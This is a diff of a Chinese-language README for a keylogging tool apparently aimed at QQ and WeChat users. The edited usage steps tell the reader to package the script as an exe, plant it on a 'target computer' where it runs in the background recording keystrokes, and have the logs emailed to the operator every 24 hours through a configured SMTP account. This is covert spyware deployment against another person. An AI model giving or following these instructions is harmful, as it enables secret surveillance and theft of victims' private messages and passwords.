@@ -22,15 +22,18 @@
 ### 使用说明
 
 1. **监视与记录**：
-   - 运行 `Application_Monitoring_v1.0.py` 程序，该程序会自动检测QQ和微信的运行状态，并开始记录键盘输入。
+   - 将 `Application_Monitoring_v1.0.py` 打包（有[打包工具](https://github.com/ystemsrx/Application-Monitoring/releases)）成exe，然后放入目标电脑运行，该程序会在后台持续自动检测QQ和微信的运行状态，并开始记录键盘输入。
    - 数据会实时存储在 `key_data.bin` 文件中。
+   - 每隔24h会通过邮件发送给你。
 
 2. **读取与导出**：
-   - 运行 `Read.py` 程序，拖入 `key_data.bin` 文件，即可查看记录的键盘输入数据。
+   - 运行 `Read.py` 程序（也可以打包），将 `key_data.bin` 文件拖入，即可查看记录的键盘输入数据。
    - 可以将数据筛选并导出为CSV或Excel文件，便于进一步分析。
 
 3. **打包工具**：
-   - 使用 `Package_tool.py` 工具可以将上述两个脚本打包成独立的可执行文件。将Python脚本拖入界面即可打包，支持添加自定义图标（拖入图片或图标即可）。
+
+   - 你的电脑必须安装Python，可以[在这里](https://www.python.org/downloads/release/python-3125/)下载安装 。
+   - 使用打包工具工具可以将上述两个脚本打包成独立的可执行文件，[点击这里](https://github.com/ystemsrx/Application-Monitoring/releases)。将Python脚本拖入界面即可打包，支持添加自定义图标（拖入图片或图标即可）。
 
 ### 需要填写的内容
 
@@ -39,7 +42,7 @@
 1. **邮箱配置**：
    - `from_addr`：发件人的邮箱地址。
    - `to_addr`：接收记录的邮箱地址。
-   - `password`：发件人的邮箱SMTP授权码。
+   - `password`：发件人的邮箱SMTP授权码，授权码请自行搜索如何获得。
 
    例如：
    ```python
